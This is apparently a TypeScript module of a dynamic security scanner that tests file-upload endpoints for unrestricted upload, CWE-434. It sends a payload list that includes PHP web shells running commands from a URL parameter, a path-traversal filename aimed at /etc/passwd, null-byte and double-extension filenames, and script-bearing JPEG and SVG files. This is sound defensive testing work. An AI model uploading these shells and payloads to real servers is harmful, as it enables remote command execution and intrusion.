/**
 * File Upload Attack - Same tests for applications with upload features
 *
 * Tests upload endpoints (e.g. /upload, /files, /image) with:
 * - Polyglot images (valid image + embedded script/HTML)
 * - Oversized files
 * - Wrong content-type
 * - Path traversal in filename
 * - Double extensions
 * - Null-byte injection
 */

import { DastEndpoint, DastAttackResult, DastAuth } from '../types';
import { httpRequest } from '../http-client';

/** Path patterns that suggest file upload */
const UPLOAD_PATH_PATTERNS = /upload|file|image|attach|avatar|picture|photo|media|import/i;

/** Malicious file payloads: [filename, contentType, body] */
const MALICIOUS_PAYLOADS: Array<{ name: string; filename: string; contentType: string; body: string | Buffer }> = [
  // Polyglot: GIF header + script
  { name: 'polyglot-gif-php', filename: 'image.gif.php', contentType: 'image/gif', body: 'GIF89a/*<?php system($_GET["c"]); ?>*/' },
  // Polyglot: JPEG + HTML (minimal valid JPEG header + script tag)
  { name: 'polyglot-jpg-html', filename: 'photo.jpg', contentType: 'image/jpeg', body: Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xFE, 0x00, 0x3C, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E, 0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29, 0x3C, 0x2F, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E]) },
  // Path traversal in filename
  { name: 'path-traversal', filename: '../../../etc/passwd', contentType: 'image/png', body: Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) },
  // Null byte in filename (PHP old behavior)
  { name: 'null-byte', filename: 'shell.php\x00.jpg', contentType: 'application/x-php', body: '<?php system($_GET["c"]); ?>' },
  // Double extension
  { name: 'double-ext', filename: 'image.jpg.phtml', contentType: 'image/jpeg', body: Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]) },
  // SVG with script (XSS via SVG)
  { name: 'svg-xss', filename: 'image.svg', contentType: 'image/svg+xml', body: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>' },
  // Oversized (trigger limit bypass) - skip in default to avoid timeouts
  { name: 'oversized', filename: 'large.bin', contentType: 'application/octet-stream', body: Buffer.alloc(2 * 1024 * 1024, 0x41) },
];

export async function runFileUploadAttacks(
  endpoints: DastEndpoint[],
  baseUrl: string,
  auth?: DastAuth,
  timeout = 10000
): Promise<DastAttackResult[]> {
  const uploadEndpoints = endpoints.filter(
    e => UPLOAD_PATH_PATTERNS.test(e.path || e.url) || (e.parameters || []).some(p => /file|image|upload|avatar/i.test(p.name))
  );

  // Also probe common upload paths when no endpoints matched
  const commonPaths = ['/upload', '/api/upload', '/files', '/image', '/api/image', '/avatar', '/media/upload'];
  const base = baseUrl.replace(/\/$/, '');
  const probeUrls: { url: string; paramName: string }[] = uploadEndpoints.slice(0, 5).map(ep => ({
    url: ep.url.startsWith('http') ? ep.url : base + (ep.path || '/'),
    paramName: (ep.parameters || []).find(p => /file|image|upload|avatar|picture/i.test(p.name))?.name || 'file',
  }));
  if (probeUrls.length === 0) {
    for (const p of commonPaths) probeUrls.push({ url: base + p, paramName: 'file' });
  }

  const vulns: DastAttackResult[] = [];
  const payloadsToRun = MALICIOUS_PAYLOADS.filter(p => p.name !== 'oversized'); // Skip oversized by default

  for (const { url: targetUrl, paramName } of probeUrls.slice(0, 5)) {
    for (const payload of payloadsToRun.slice(0, 5)) {
      try {
        const { boundary, body } = buildMultipart(paramName, payload.filename, payload.contentType, payload.body);
        const res = await httpRequest({
          url: targetUrl,
          method: 'POST',
          headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
          },
          body,
          auth,
          timeout: 15000,
        });

        if (res.status >= 200 && res.status < 300) {
          const bodyLower = (res.body || '').toLowerCase();
          if (/uploaded|success|saved|stored|url|path|filename/i.test(bodyLower) || res.status === 201) {
            vulns.push({
              type: 'file-upload',
              severity: 'high',
              title: `Unrestricted File Upload - ${payload.name}`,
              description: `Upload endpoint accepted potentially dangerous file (${payload.filename}). Verify file validation.`,
              endpoint: targetUrl,
              method: 'POST',
              payload: payload.name,
              paramName,
              paramLocation: 'body',
              evidence: `Status ${res.status}, response suggests upload succeeded`,
              recommendation: 'Validate file type (magic bytes), restrict extensions, sanitize filenames, store outside webroot.',
              cwe: ['CWE-434'],
              cvss: 8.8,
            });
          }
        }
      } catch { /* skip */ }
    }
  }

  return vulns;
}

function buildMultipart(
  fieldName: string,
  filename: string,
  contentType: string,
  content: string | Buffer
): { boundary: string; body: Buffer } {
  const boundary = '----WebKitFormBoundary' + Math.random().toString(36).slice(2);
  const raw: Buffer = content instanceof Buffer ? content : Buffer.from(content as string, 'utf8');
  const parts = [
    `--${boundary}\r\n`,
    `Content-Disposition: form-data; name="${fieldName}"; filename="${filename}"\r\n`,
    `Content-Type: ${contentType}\r\n\r\n`,
  ];
  const header = Buffer.from(parts.join(''), 'utf8');
  const footer = Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8');
  const body = Buffer.concat([header, raw, footer]);
  return { boundary, body };
}
